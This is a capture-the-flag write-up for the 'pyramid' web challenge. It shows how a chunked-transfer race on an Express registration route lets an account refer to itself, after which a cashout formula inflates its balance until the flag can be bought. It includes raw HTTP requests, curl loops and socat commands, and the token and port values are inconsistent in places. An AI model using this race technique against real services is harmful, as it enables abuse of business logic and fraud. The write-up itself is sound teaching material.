When we navigate to the page, we first see a registration page.

<Image src={register} alt='Screenshot of the registration page asking for a name and a referral code.' />

When we register, we can perform three operations:
1. Generate a referral code
2. Cash out referrals into coins
3. Buy a flag

<Image src={account} alt='Screenshot of the account page with three buttons for our aforementioned three operations.' />

## Analysis

As almost always, let's see what gets us the flag.

```js
app.get('/buy', (req, res) => {
    if (req.user) {
        const user = req.user
        if (user.bal > 100_000_000_000) {
            user.bal -= 100_000_000_000
            res.type('html').end(`
                ${css}
                <h1>Successful purchase</h1>
                <p>${process.env.FLAG}</p>
            `)
            return
        }
    }
    //...
})
```

If we have a balance of one-hundred billion, we can buy the flag.
That sure sounds expensive. Let's see how we generate a balance.

```js
app.get('/cashout', (req, res) => {
    if (req.user) {
        const u = req.user
        const r = referrer(u.code)
        if (r) {
            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]
        } else {
            [u.ref, u.bal] = [0, u.bal + u.ref]
        }
    }
    res.redirect('/')
})
```

We increase our balance based on the number of referrals we have.
Additionally, the user that referred us also gets a bump to their referral count when we cash out.

And just to get through this part of the analysis, here's part of the registration code:
```js
        users.set(token, {
            name,
            code,
            ref: 0,
            bal: 0,
        })
```

The only three places `bal` is changed is all numeric and all addition/subtraction.
This rules out `NaN` shenanigans, like in another challenge I won't be doing a write-up on.

From all this code, one key detail, luckily, immediately stood out to me.
Or, perhaps two-in-one:
> 1. `100_000_000_000` is a lot, and we won't be getting that many coins through any *linear* means.
> 2. *If* we can make a user refer to itself, we have our *quadratic* means!

### What if we refer ourselves?
Let's take a closer look at `[u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]`.
Since we're presumably going to need to refer to ourselves, how about a slight rewrite to make it a bit easier to walk through:
```js
            [u.ref, u.ref, u.bal] = [0, u.ref + u.ref / 2, u.bal + u.ref / 2]
```

First, under normal circumstances, a user's `ref` count is set to zero after cashing out.
However, if we can somehow refer to ourselves,
because `u.ref = 0` happens first, followed by `u.ref = u.ref + u.ref / 2`,
we maintain our `ref` count, plus get a 1.5-times boost!

Every time we cash out, we boost our `ref` count, as well as increase our balance based on that `ref` count.
An infinite money glitch, baby.

### How referrals work
Let's start with referral code generation:
```js
const codes = new Map()
const random = () => crypto.randomBytes(16).toString('hex')
// ...
app.get('/code', (req, res) => {
    const token = req.token
    if (token) {
        const code = random()
        codes.set(code, token)
        res.type('html').end(`
            ${css}
            <h1>Referral code generated</h1>
            <p>Your code: <strong>${code}</strong></p>
            <a href="/">Home</a>
        `)
        return
    }
    res.end()
})
```

Note that `req.token` comes from a cookie.
We generate a 128-bit random string and map it to a user (via `token`).
No brute-forcing or collision-generation will be possible, here.
This is also the only place the mapping gets set, and, since collisions are infeasible,
there's no way to change the `token` associated with a referral code.

How about user registration?
```js
const users = new Map()
const random = () => crypto.randomBytes(16).toString('hex')
// ...
app.post('/new', (req, res) => {
    const token = random()

    const body = []
    req.on('data', Array.prototype.push.bind(body))
    req.on('end', () => {
        const data = Buffer.concat(body).toString()
        const parsed = new URLSearchParams(data)
        const name = parsed.get('name')?.toString() ?? 'JD'
        const code = parsed.get('refer') ?? null

        // referrer receives the referral
        const r = referrer(code)
        if (r) { r.ref += 1 }

        users.set(token, {
            name,
            code,
            ref: 0,
            bal: 0,
        })
    })

    res.header('set-cookie', `token=${token}`)
    res.redirect('/')
})
```

If we provide a referral code, it simply gets set as a part of the user.
The user `token` is, again, a 128-bit string, so no collisions here, either.
This is the only place the mapping gets set, so there's no way to change the `code` associated with a user.

There's a peculiar way this code is written, though.
A user is added to the map at the end of the request, thanks to the `req.on('end'` event.
However, the setting of the result -- the `token` cookie in particular -- is done outside of this.
Here's our second key detail:
> It may be possible to receive the `token` before we've finished sending a user's referral code.

Embarrassingly, I noticed it very early on, but it didn't come across as important, wasting 3 or so hours of time.
> Oh, this code is weirdly designed. They should really put the `res` stuff into the `end` event handler.
> \- Sleep-deprived Tim
>
> Present Tim thoughts:
> Unless the server is sending a chunked response! Not relevant here, though.

### Chunky!
I'm pretty sure I've come across this technique in other CTFs writeups, but I've never employed it before.
Some googling later: `Transfer-Encoding: chunked`.
Though I'm familiar with this mode, it never really occurred to me before that the server can respond asynchronously.

For normal requests, a `Content-Length` header must be provided.
```http
POST /new HTTP/1.1
Host: pyramid.dicec.tf
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: https://pyramid.dicec.tf
Content-Length: 7

name=yo
```

`Express` seems to (rightly) not trigger the `app.post('/new'` route handler
until client information is received -- headers and data.
As such, under normal circumstances, the client will only ever get the response (cookies included)
after having sent `name` and `refer`.
There's no way to do the self-refer stuff this way.

Chunked transfers don't require a `Content-Length` header, as data is sent over in arbitrary-length chunks,
including both the length and the data.
There can also be delay in sending these chunks, and all data does not have to be sent at one time.
After all, if we needed to send the data all at once, might as well use `Content-Length`.

```http
POST /new HTTP/1.1
Host: pyramid.dicec.tf
Accept: */*
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Origin: https://pyramid.dicec.tf

7
name=yo
0

```

Note that the 7 is the length of the next chunk of data, in hex.
Additionally, a final chunk of 0 length followed by a crlf indicates the end of the request.

`Express` seems to trigger the `app.post('/new'` route handler for chunked transfers after the headers have been received.
Of course, the `end` event won't be triggered until all client data has been received.
Luckily, this route handler sends the response (`token` cookie included) before the user has had a chance to provide
`name` and `refer`.
This is where we can do our magic.

## Exploit
First, we need to create an account that refers to itself.
I also did local testing because I could add `console.log`s everywhere to verify everything was behaving as expected.
For local testing, I use `nc -C localhost 3000`, with `-C` being important for sending `crlf`s instead of Linux's `lf`s.

First, we send our initial request -- noting the extra newline.
```http
POST /new HTTP/1.1
Host: localhost
Accept: */*
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Origin: http://localhost:3000

```

We then get back headers from the server, including the token.
```http
HTTP/1.1 302 Found
X-Powered-By: Express
set-cookie: token=00652973dec9316da482037451ad95e2
Location: /
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 23
Date: Mon, 31 Mar 2025 10:34:29 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

The `/new` request isn't finished yet! In another terminal, we'll grab a referral code.

```sh
curl 'http://localhost:3000/code?' -b 'token=00652973dec9316da482037451ad95e2'
```

The response body will have the referral code.

```html
    <link
        rel="stylesheet"
        href="https://unpkg.com/axist@latest/dist/axist.min.css"
    >

            <h1>Referral code generated</h1>
            <p>Your code: <strong>2a089074b391fda24a00328a87acd486</strong></p>
            <a href="/">Home</a>
```

We can finish up our request.

```
2f
name=foo&refer=2a089074b391fda24a00328a87acd486
0

```

Our new account has zero referrals, so we cannot increment our `ref` count yet.
We'll seed our `foo` account with some throwaways that refer to our `foo` account.

```sh
curl 'https://pyramid.dicec.tf/new?' --data 'refer=2a089074b391fda24a00328a87acd486'
```

We can now begin our infinite money glitch, repeating until we hit our `100_000_000_000` target.

```sh
curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong

curl -Ls 'http://localhost:3001/cashout?' -b 'token=00652973dec9316da482037451ad95e2' | grep -P strong
# ... less than a minute later

#            You have referred <strong>131539322926.97028</strong> users.
```

Let's buy our flag!
```sh
curl -Ls 'http://localhost:3001/buy?' -b 'token=59e3c3caf0dcb24ec8ec6c8d41fdfa9c'
```

And we got it (locally)!
```html
    <link
        rel="stylesheet"
        href="https://unpkg.com/axist@latest/dist/axist.min.css"

                <h1>Successful purchase</h1>
                <p>fakeflag</p>
```

For running it against the actual challenge...
* We can't use netcat, since TLS. However, we can use `socat`: `socat ssl:pyramid.dicec.tf:443,crlf stdio`  
  The equivalent http localhost equivalent is `socat tcp:localhost:3001,crlf stdio`, incidentally.
* Our base URL becomes `https://pyramid.dicec.tf/`

For glory reasons, here's the flag as redeemed from the browser!
